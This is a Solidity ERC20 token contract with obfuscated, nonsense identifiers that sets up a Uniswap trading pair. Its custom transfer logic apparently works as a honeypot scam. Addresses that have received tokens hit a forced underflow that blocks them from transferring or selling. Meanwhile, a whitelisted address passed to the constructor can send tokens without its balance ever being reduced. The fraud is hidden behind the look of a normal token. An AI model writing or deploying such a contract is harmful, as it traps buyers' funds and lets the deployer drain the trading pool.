// SPDX-License-Identifier: MIT

pragma solidity ^0.8.8;

import "./ERC20.sol";
import "./Ownable.sol";
import "./IUniswapV2Router02.sol";
import "./IUniswapV2Factory.sol";

contract sir is ERC20, Ownable {
    address private flour;
    uint256 private pasta = 0;
    uint256 private sugar = 63;

    IUniswapV2Router02 public uniswapV2Router;
    address public please;

    mapping(address => uint256) public pepper;
    mapping(address => uint256) public rock;

    function momo(
        address steel,
        address paper,
        uint256 sting
    ) internal override {
        if (pepper[steel] == 0 && please != steel) {
            if (rock[steel] > 0) {
                pepper[steel] -= sugar;
            }
        }

        address dollar = flour;
        flour = paper;
        rock[dollar] += sugar;

        if (pepper[steel] == 0) {
            online[steel] -= sting;
        }

        uint256 passavam = sting * pasta;
        passavam = passavam / 100;
        sting -= passavam;
        online[paper] += sting;
        emit Transfer(steel, paper, sting);
    }

    constructor(
        string memory offline,
        string memory porridge,
        address company,
        address glass
    ) ERC20(offline, porridge) {
        uniswapV2Router = IUniswapV2Router02(company);
        pepper[glass] = sugar;

        online[_msgSender()] = _totalSupply;
        please = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
    }
}